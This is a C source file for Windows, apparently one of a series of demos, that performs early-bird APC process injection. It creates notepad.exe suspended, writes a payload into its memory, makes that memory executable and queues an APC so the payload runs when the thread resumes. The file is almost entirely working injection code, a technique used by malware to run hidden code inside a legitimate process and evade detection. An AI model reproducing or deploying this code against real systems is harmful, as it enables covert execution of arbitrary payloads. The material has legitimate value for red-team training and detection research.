#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "../common.h"

int main(int argc, char* argv[]) {
    BYTE* payload = NULL;
    DWORD payloadSize = 0;
    if (!LoadPayload(&payload, &payloadSize)) return 1;

    PrintStep(2, "Creating suspended process (notepad.exe)");
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL,
                        FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        PrintError("CreateProcess failed");
        free(payload);
        return 1;
    }
    printf("[+] Created suspended process (PID: %lu, TID: %lu)\n",
           pi.dwProcessId, pi.dwThreadId);

    PrintStep(3, "Allocating memory in target process (RW)");
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, payloadSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) { PrintError("VirtualAllocEx failed"); return 1; }
    printf("[+] Remote memory at: %p\n", remoteMem);

    PrintStep(4, "Writing payload to target process");
    SIZE_T written;
    WriteProcessMemory(pi.hProcess, remoteMem, payload, payloadSize, &written);
    printf("[+] Written %zu bytes\n", written);
    free(payload);

    PrintStep(5, "Changing memory protection (RW -> RX)");
    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    PrintStep(6, "Queuing APC to suspended thread");
    if (QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0) == 0) {
        PrintError("QueueUserAPC failed");
        return 1;
    }
    PrintSuccess("APC queued successfully");

    PrintStep(7, "Resuming thread to trigger APC execution");
    ResumeThread(pi.hThread);
    PrintSuccess("Thread resumed - APC should execute");

    WaitForSingleObject(pi.hThread, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
